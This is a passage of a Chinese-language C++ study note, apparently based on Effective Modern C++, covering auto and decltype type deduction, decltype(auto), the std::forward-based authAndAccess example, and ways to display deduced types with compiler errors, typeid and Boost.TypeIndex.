class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt; v;<br><br><span class="hljs-keyword">auto</span> resetV = <br>    [&amp;v](<span class="hljs-keyword">const</span> <span class="hljs-keyword">auto</span>&amp; newValue)&#123; v = newValue; &#125;;        <span class="hljs-comment">//C++14</span><br><br>resetV(&#123; <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span> &#125;);            <span class="hljs-comment">//错误！不能推导&#123; 1, 2, 3 &#125;的类型</span><br></code></pre></div></td></tr></table></figure><h3><span id="结论">结论</span></h3><ul><li><code>auto</code>类型推导通常和模板类型推导相同，但是<code>auto</code>类型推导假定花括号初始化代表<code>std::initializer_list</code>，而模板类型推导不这样做</li><li>在C++14中<code>auto</code>允许出现在函数返回值或者<em>lambda</em>函数形参中，但是它的工作机制是模板类型推导那一套方案，而不是<code>auto</code>类型推导</li></ul><h2><span id="3-decltype">3 decltype</span></h2><p><code>decltype</code>，给它一个名字或者表达式<code>decltype</code>就会告诉你这个名字或者表达式的类型。通常，它会精确的告诉你你想要的结果。</p><p><code>decltype</code>只是简单的返回名字或者表达式的类型：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>;                <span class="hljs-comment">//decltype(i)是const int</span><br><br><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">f</span><span class="hljs-params">(<span class="hljs-keyword">const</span> Widget&amp; w)</span></span>;        <span class="hljs-comment">//decltype(w)是const Widget&amp;</span><br>                                <span class="hljs-comment">//decltype(f)是bool(const Widget&amp;)</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Point</span>&#123;</span><br>    <span class="hljs-keyword">int</span> x,y;                    <span class="hljs-comment">//decltype(Point::x)是int</span><br>&#125;;                              <span class="hljs-comment">//decltype(Point::y)是int</span><br><br>Widget w;                       <span class="hljs-comment">//decltype(w)是Widget</span><br><br><span class="hljs-keyword">if</span> (f(w))…                      <span class="hljs-comment">//decltype(f(w))是bool</span><br></code></pre></div></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T&gt;            <span class="hljs-comment">//std::vector的简化版本</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">vector</span>&#123;</span><br><span class="hljs-keyword">public</span>:<br>    …<br>    T&amp; <span class="hljs-keyword">operator</span>[](<span class="hljs-built_in">std</span>::<span class="hljs-keyword">size_t</span> index);<br>    …<br>&#125;;<br><br><span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt; v;                  <span class="hljs-comment">//decltype(v)是vector&lt;int&gt;</span><br>…<br><span class="hljs-keyword">if</span> (v[<span class="hljs-number">0</span>] == <span class="hljs-number">0</span>)…                 <span class="hljs-comment">//decltype(v[0])是int&amp;</span><br></code></pre></div></td></tr></table></figure><p>在C++11中，<code>decltype</code>最主要的用途就是用于声明函数模板，而这个函数返回类型依赖于形参类型。</p><p>对一个<code>T</code>类型的容器使用<code>operator[]</code>通常会返回一个<code>T&amp;</code>对象，比如<code>std::deque</code>就是这样。</p><p>但是<code>std::vector</code>有一个例外，对于<code>std::vector&lt;bool&gt;</code>，<code>operator[]</code>不会返回<code>bool&amp;</code>，它会返回一个全新的对象（MSVC的STL实现中返回的是<code>std::_Vb_reference&lt;std::_Wrap_alloc&lt;std::allocator&lt;unsigned int&gt;&gt;&gt;</code>对象）。</p><h3><span id="decltype获取返回值类型的示例">decltype获取返回值类型的示例</span></h3><p>使用<code>decltype</code>计算返回类型的一个例子是：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> Container, <span class="hljs-keyword">typename</span> Index&gt;    <span class="hljs-comment">//可以工作，</span><br><span class="hljs-function"><span class="hljs-keyword">auto</span> <span class="hljs-title">authAndAccess</span><span class="hljs-params">(Container&amp; c, Index i)</span>       <span class="hljs-comment">//但是需要改良</span></span><br>    -&gt;decltype(c[i])<br>&#123;<br>    authenticateUser();<br>    <span class="hljs-keyword">return</span> c[i];<br>&#125;<br></code></pre></div></td></tr></table></figure><p>函数名称前面的<code>auto</code>不会做任何的类型推导工作。相反的，他只是暗示使用了C++11的<strong>尾置返回类型</strong>语法，即在函数形参列表后面使用一个”<code>-&gt;</code>“符号指出函数的返回类型，尾置返回类型的好处是我们可以在函数返回类型中使用函数形参相关的信息。在<code>authAndAccess</code>函数中，我们使用<code>c</code>和<code>i</code>指定返回类型。</p><p>在C++14标准下我们可以忽略尾置返回类型，只留下一个<code>auto</code>。使用这种声明形式，auto标示这里会发生类型推导。更准确的说，编译器将会从函数实现中推导出函数的返回类型。</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> Container, <span class="hljs-keyword">typename</span> Index&gt;    <span class="hljs-comment">//C++14版本，</span><br><span class="hljs-function"><span class="hljs-keyword">auto</span> <span class="hljs-title">authAndAccess</span><span class="hljs-params">(Container&amp; c, Index i)</span>       <span class="hljs-comment">//不那么正确</span></span><br><span class="hljs-function"></span>&#123;<br>    authenticateUser();<br>    <span class="hljs-keyword">return</span> c[i];                                <span class="hljs-comment">//从c[i]中推导返回类型</span><br>&#125;<br></code></pre></div></td></tr></table></figure><h3><span id="从返回对象进行修改">从返回对象进行修改</span></h3><p>上述代码出现的一个问题是：</p><p><code>operator[]</code>对于大多数<code>T</code>类型的容器会返回一个<code>T&amp;</code>，但是条款1解释了在模板类型推导期间，表达式的引用性（reference-ness）会被忽略。基于这样的规则，考虑它会对下面用户的代码有哪些影响：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-built_in">std</span>::<span class="hljs-built_in">deque</span>&lt;<span class="hljs-keyword">int</span>&gt; d;<br>…<br>authAndAccess(d, <span class="hljs-number">5</span>) = <span class="hljs-number">10</span>;               <span class="hljs-comment">//认证用户，返回d[5]，</span><br>                                        <span class="hljs-comment">//然后把10赋值给它</span><br>                                        <span class="hljs-comment">//无法通过编译器！</span><br></code></pre></div></td></tr></table></figure><p>在这里<code>d[5]</code>本该返回一个<code>int&amp;</code>，但是模板类型推导会剥去引用的部分，因此产生了<code>int</code>返回类型。函数返回的那个<code>int</code>是一个右值，上面的代码尝试把10赋值给右值<code>int</code>，C++11禁止这样做，所以代码无法编译。</p><p>要想让<code>authAndAccess</code>像我们期待的那样工作，我们需要使用<code>decltype</code>类型推导来推导它的返回值，即指定<code>authAndAccess</code>应该返回一个和<code>c[i]</code>表达式类型一样的类型。</p><p>因此我们可以这样写<code>authAndAccess</code>：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> Container, <span class="hljs-keyword">typename</span> Index&gt;    <span class="hljs-comment">//C++14版本，</span><br><span class="hljs-keyword">decltype</span>(<span class="hljs-keyword">auto</span>)                                  <span class="hljs-comment">//可以工作，</span><br>authAndAccess(Container&amp; c, Index i)            <span class="hljs-comment">//但是还需要</span><br>&#123;                                               <span class="hljs-comment">//改良</span><br>    authenticateUser();<br>    <span class="hljs-keyword">return</span> c[i];<br>&#125;<br></code></pre></div></td></tr></table></figure><p>现在<code>authAndAccess</code>将会真正的返回<code>c[i]</code>的类型。现在事情解决了，一般情况下<code>c[i]</code>返回<code>T&amp;</code>，<code>authAndAccess</code>也会返回<code>T&amp;</code>，特殊情况下<code>c[i]</code>返回一个对象，<code>authAndAccess</code>也会返回一个对象。</p><blockquote><p><code>decltype(auto)</code>的使用不仅仅局限于函数返回类型，当你想对初始化表达式使用<code>decltype</code>推导的规则，你也可以使用：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp">Widget w;<br><br><span class="hljs-keyword">const</span> Widget&amp; cw = w;<br><br><span class="hljs-keyword">auto</span> myWidget1 = cw;                    <span class="hljs-comment">//auto类型推导</span><br>                                     <span class="hljs-comment">//myWidget1的类型为Widget</span><br><span class="hljs-keyword">decltype</span>(<span class="hljs-keyword">auto</span>) myWidget2 = cw;          <span class="hljs-comment">//decltype类型推导</span><br>                                     <span class="hljs-comment">//myWidget2的类型是const Widget&amp;</span><br></code></pre></div></td></tr></table></figure></blockquote><h3><span id="形参传递问题">形参传递问题</span></h3><p><code>authAndAccess</code>声明：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> Container, <span class="hljs-keyword">typename</span> Index&gt;<br><span class="hljs-function"><span class="hljs-keyword">decltype</span>(<span class="hljs-keyword">auto</span>) <span class="hljs-title">authAndAccess</span><span class="hljs-params">(Container&amp; c, Index i)</span></span>;<br></code></pre></div></td></tr></table></figure><p>容器通过传引用的方式传递非常量左值引用（lvalue-reference-to-non-const），因为返回一个引用允许用户可以修改容器。</p><p>但是这意味着在不能给这个函数传递右值容器，右值不能被绑定到左值引用上，除非这个左值引用是一个const（lvalue-references-to-const）。</p><p>一个右值容器，是一个临时对象，通常会在<code>authAndAccess</code>调用结束被销毁，这意味着<code>authAndAccess</code>返回的引用将会成为一个悬置的（dangle）引用。</p><p>为了使<code>authAndAccess</code>的引用可以绑定左值和右值，可以使用通用引用。所以我们这样声明：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> Containter, <span class="hljs-keyword">typename</span> Index&gt;   <span class="hljs-comment">//现在c是通用引用</span><br><span class="hljs-function"><span class="hljs-keyword">decltype</span>(<span class="hljs-keyword">auto</span>) <span class="hljs-title">authAndAccess</span><span class="hljs-params">(Container&amp;&amp; c, Index i)</span></span>;<br></code></pre></div></td></tr></table></figure><p>这行代码中还有一个问题：</p><p>在这个模板中，我们不知道我们操纵的容器的类型是什么，也就是说不知道它使用的索引对象（indexobjects）的类型。</p><p>对一个未知类型的对象使用传值通常会造成不必要的拷贝，对程序的性能有极大的影响，还会造成对象切片行为。</p><p>但是只针对 STL容器（比如<code>std::string</code>，<code>std::vector</code>和<code>std::deque</code>的<code>operator[]</code>），这样处理是合理的。</p><p>为了保持参数本身的左右值属性，还需要进行<code>std::forward</code>：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> Container, <span class="hljs-keyword">typename</span> Index&gt;    <span class="hljs-comment">//最终的C++14版本</span><br><span class="hljs-keyword">decltype</span>(<span class="hljs-keyword">auto</span>)<br>authAndAccess(Container&amp;&amp; c, Index i)<br>&#123;<br>    authenticateUser();<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">std</span>::forward&lt;Container&gt;(c)[i];<br>&#125;<br></code></pre></div></td></tr></table></figure><p>C++11版本：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> Container, <span class="hljs-keyword">typename</span> Index&gt;    <span class="hljs-comment">//最终的C++11版本</span><br><span class="hljs-keyword">auto</span><br>authAndAccess(Container&amp;&amp; c, Index i)<br>-&gt;<span class="hljs-keyword">decltype</span>(<span class="hljs-built_in">std</span>::forward&lt;Container&gt;(c)[i])<br>&#123;<br>    authenticateUser();<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">std</span>::forward&lt;Container&gt;(c)[i];<br>&#125;<br></code></pre></div></td></tr></table></figure><p>将<code>decltype</code>应用于变量名会产生该变量名的声明类型。虽然变量名都是左值表达式，但这不会影响<code>decltype</code>的行为。但是对于一些表达式，其类型推导结果，可能出现&amp;引用类型：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">decltype</span>(<span class="hljs-keyword">auto</span>) <span class="hljs-title">f1</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> x = <span class="hljs-number">0</span>;<br>    …<br>    <span class="hljs-keyword">return</span> x;                            <span class="hljs-comment">//decltype(x）是int，所以f1返回int</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">decltype</span>(<span class="hljs-keyword">auto</span>) <span class="hljs-title">f2</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> x = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">return</span> (x);                          <span class="hljs-comment">//decltype((x))是int&amp;，所以f2返回int&amp;</span><br>&#125;<br></code></pre></div></td></tr></table></figure><p>对于名字来说，<code>x</code>是一个左值，C++11定义了表达式<code>(x)</code>也是一个左值。<code>decltype((x))</code>是<code>int&amp;</code>。用小括号覆盖一个名字可以改变<code>decltype</code>对于名字产生的结果。</p><p>因此，当使用<code>decltype(auto)</code>的时候一定要加倍的小心，在表达式中看起来无足轻重的细节将会影响到<code>decltype(auto)</code>的推导结果。</p><h3><span id="结论">结论</span></h3><ul><li><code>decltype</code>产生变量或者表达式的类型</li><li>对于<code>T</code>类型的不是单纯的变量名的左值表达式，<code>decltype</code>总是产出<code>T</code>的引用即<code>T&amp;</code></li><li>C++14支持<code>decltype(auto)</code>，推导出类型，但是它使用<code>decltype</code>的规则进行推导，而不是<code>auto</code></li></ul><h2><span id="4-查看类型推导结果">4 查看类型推导结果</span></h2><p>三种方案：</p><ul><li>IDE编辑器获得类型推导的结果</li><li>在编译期间获得结果</li><li>在运行时获得结果</li></ul><h3><span id="ide">IDE</span></h3><p>IDE之所以能提供这些信息是因为一个C++编译器（或者至少是前端中的一个部分）运行于IDE中。如果这个编译器对你的代码不能做出有意义的分析或者推导，它就不会显示推导的结果。</p><h3><span id="编译">编译</span></h3><p>可以首先声明一个类模板但<strong>不定义</strong>。就像这样：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T&gt;                <span class="hljs-comment">//只对TD进行声明</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TD</span>;</span>                           <span class="hljs-comment">//TD == "Type Displayer"</span><br></code></pre></div></td></tr></table></figure><p>尝试实例化这个类模板就会引出一个错误消息，因为这里没有用来实例化的类模板定义。为了查看<code>x</code>和<code>y</code>的类型，只需要使用它们的类型去实例化<code>TD</code>：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp">TD&lt;<span class="hljs-keyword">decltype</span>(x)&gt; xType;              <span class="hljs-comment">//引出包含x和y</span><br>TD&lt;<span class="hljs-keyword">decltype</span>(y)&gt; yType;              <span class="hljs-comment">//的类型的错误消息</span><br></code></pre></div></td></tr></table></figure><p>出现 undefined template TD&lt;xxx&gt;。</p><h3><span id="运行时">运行时</span></h3><p>使用<code>printf</code>的方法使类型信息只有在运行时才会显示出来（尽管不建议使用<code>printf</code>）。</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-keyword">typeid</span>(x).name() &lt;&lt; <span class="hljs-string">'\n'</span>;  <span class="hljs-comment">//显示x和y的类型</span><br><span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-keyword">typeid</span>(y).name() &lt;&lt; <span class="hljs-string">'\n'</span>;<br></code></pre></div></td></tr></table></figure><p>这种方法对一个对象如<code>x</code>或<code>y</code>调用<code>typeid</code>产生一个<code>std::type_info</code>的对象，然后<code>std::type_info</code>里面的成员函数<code>name()</code>来产生一个C风格的字符串（即一个<code>const char*</code>）表示变量的名字。</p><p>调用<code>std::type_info::name</code>不保证返回任何有意义的东西，但是库的实现者尝试尽量使它们返回的结果有用。</p><p>举个例子，GNU和Clang环境下<code>x</code>的类型会显示为"<code>i</code>"，<code>y</code>会显示为"<code>PKi</code>"。"<code>i</code>"表示"<code>int</code>"，""<code>PK</code>"表示"pointerto <del><code>konst</code></del><code>const</code>"（指向常量的指针）。</p><p>如果传递的是一个引用，那么引用部分（reference-ness）将被忽略，如果忽略后还具有<code>const</code>或者<code>volatile</code>，那么常量性<code>const</code>ness或者易变性<code>volatile</code>ness也会被忽略。</p><p><code>std::type_info::name</code>的结果并不总是可信的，因为<code>std::type_info::name</code>规范批准像传值形参一样来对待这些类型。BoostTypeIndex库（<strong>Boost.TypeIndex</strong>）是更好的选择。</p><p>例如：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;boost/type_index.hpp&gt;</span></span><br><br><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T&gt;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">f</span><span class="hljs-params">(<span class="hljs-keyword">const</span> T&amp; param)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">using</span> <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span>;<br>    <span class="hljs-keyword">using</span> boost::typeindex::type_id_with_cvr;<br><br>    <span class="hljs-comment">//显示T</span><br>    <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">"T =     "</span><br>         &lt;&lt; type_id_with_cvr&lt;T&gt;().pretty_name()<br>         &lt;&lt; <span class="hljs-string">'\n'</span>;<br>    <br>    <span class="hljs-comment">//显示param类型</span><br>    <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">"param = "</span><br>         &lt;&lt; type_id_with_cvr&lt;<span class="hljs-keyword">decltype</span>(param)&gt;().pretty_name()<br>         &lt;&lt; <span class="hljs-string">'\n'</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p><code>boost::typeindex::type_id_with_cvr</code>获取一个类型实参（我们想获得相应信息的那个类型），它不消除实参的<code>const</code>，<code>volatile</code>和引用修饰符（因此模板名中有“<code>with_cvr</code>”）。结果是一个<code>boost::typeindex::type_index</code>对象，它的<code>pretty_name</code>成员函数输出一个<code>std::string</code>，包含我们能看懂的类型表示。基于这个<code>f</code>的实现版本，再次考虑那个使用<code>typeid</code>时获取<code>param</code>类型信息出错的调用：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-built_in">std</span>::vetor&lt;Widget&gt; <span class="hljs-title">createVec</span><span class="hljs-params">()</span></span>;         <span class="hljs-comment">//工厂函数</span><br><span class="hljs-keyword">const</span> <span class="hljs-keyword">auto</span> vw = createVec();            <span class="hljs-comment">//使用工厂函数返回值初始化vw</span><br><span class="hljs-keyword">if</span> (!vw.empty())&#123;<br>    f(&amp;vw[<span class="hljs-number">0</span>]);                          <span class="hljs-comment">//调用f</span><br>    …<br>&#125;<br></code></pre></div></td></tr></table></figure><p>在GNU和Clang的编译器环境下，使用Boost.TypeIndex版本的<code>f</code>最后会产生下面的（准确的）输出：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp">T =     Widget <span class="hljs-keyword">const</span> *<br>param = Widget <span class="hljs-keyword">const</span> * <span class="hljs-keyword">const</span>&amp;<br></code></pre></div></td></tr></table></figure><p>在Microsoft的编译器环境下，结果也是极其相似：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp">T =     class Widget <span class="hljs-keyword">const</span> *<br>param = class Widget <span class="hljs-keyword">const</span> * <span class="hljs-keyword">const</span> &amp;<br></code></pre></div></td></tr></table></figure><h3><span id="结论">结论</span></h3><ul><li>类型推断可以使用IDE，使用编译器报错，使用Boost.TypeIndex库</li><li>这些工具可能既不准确也无帮助，所以理解C++类型推导规则才是最重要的</li></ul><h2><span id="5优先考虑auto而非显式类型声明">5优先考虑<code>auto</code>而非显式类型声明</span></h2><p>从程序员的角度来说，如果按照符合规定的流程走，那<code>auto</code>类型推导的一些结果是错误的。当这些情况发生时，引导<code>auto</code>产生正确的结果是很重要的。</p><p><code>auto</code>变量从初始化表达式中推导出类型，所以我们必须初始化。</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">int</span> x1;                         <span class="hljs-comment">//潜在的未初始化的变量</span><br><br><span class="hljs-keyword">auto</span> x2;                        <span class="hljs-comment">//错误！必须要初始化</span><br><br><span class="hljs-keyword">auto</span> x3 = <span class="hljs-number">0</span>;                    <span class="hljs-comment">//没问题，x已经定义了</span><br><br><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> It&gt;           <br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">dwim</span><span class="hljs-params">(It b,It e)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">while</span> (b != e) &#123;<br>        <span class="hljs-keyword">auto</span> currValue = *b;<br>        …<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">auto</span> derefUPLess = <br>    [](<span class="hljs-keyword">const</span> <span class="hljs-built_in">std</span>::<span class="hljs-built_in">unique_ptr</span>&lt;Widget&gt; &amp;p1,       <span class="hljs-comment">//用于std::unique_ptr</span><br>       <span class="hljs-keyword">const</span> <span class="hljs-built_in">std</span>::<span class="hljs-built_in">unique_ptr</span>&lt;Widget&gt; &amp;p2)       <span class="hljs-comment">//指向的Widget类型的</span><br>    &#123; <span class="hljs-keyword">return</span> *p1 &lt; *p2; &#125;;                      <span class="hljs-comment">//比较函数</span><br></code></pre></div></td></tr></table></figure><p>如果使用C++14，将会变得更酷，因为<em>lambda</em>表达式中的形参也可以使用<code>auto</code>：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">auto</span> derefLess =                                <span class="hljs-comment">//C++14版本</span><br>    [](<span class="hljs-keyword">const</span> <span class="hljs-keyword">auto</span>&amp; p1,                          <span class="hljs-comment">//被任何像指针一样的东西</span><br>       <span class="hljs-keyword">const</span> <span class="hljs-keyword">auto</span>&amp; p2)                          <span class="hljs-comment">//指向的值的比较函数</span><br>    &#123; <span class="hljs-keyword">return</span> *p1 &lt; *p2; &#125;;<br><br><span class="hljs-comment">// 也即</span><br><span class="hljs-built_in">std</span>::function&lt;<span class="hljs-keyword">bool</span>(<span class="hljs-keyword">const</span> <span class="hljs-built_in">std</span>::<span class="hljs-built_in">unique_ptr</span>&lt;Widget&gt; &amp;,<br>                   <span class="hljs-keyword">const</span> <span class="hljs-built_in">std</span>::<span class="hljs-built_in">unique_ptr</span>&lt;Widget&gt; &amp;)&gt;<br>derefUPLess = [](<span class="hljs-keyword">const</span> <span class="hljs-built_in">std</span>::<span class="hljs-built_in">unique_ptr</span>&lt;Widget&gt; &amp;p1,<br>                 <span class="hljs-keyword">const</span> <span class="hljs-built_in">std</span>::<span class="hljs-built_in">unique_ptr</span>&lt;Widget&gt; &amp;p2)<br>                &#123; <span class="hljs-keyword">return</span> *p1 &lt; *p2; &#125;;<br></code></pre></div></td></tr></table></figure><p>实例化<code>std::function</code>并声明一个对象这个对象将会有固定的大小。这个大小可能不足以存储一个闭包，这个时候<code>std::function</code>的构造函数将会在堆上面分配内存来存储，这就造成了使用<code>std::function</code>比<code>auto</code>声明变量会消耗更多的内存。</p><p>通过<code>std::function</code>调用一个闭包几乎无疑比<code>auto</code>声明的对象调用要慢。换句话说，<code>std::function</code>方法比<code>auto</code>方法要更耗空间且更慢，还可能有<em>out-of-memory</em>异常。并且正如上面的例子，比起写<code>std::function</code>实例化的类型来，使用<code>auto</code>要方便得多。</p><p>考虑以下问题：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt; v;<br>…<br><span class="hljs-keyword">unsigned</span> sz = 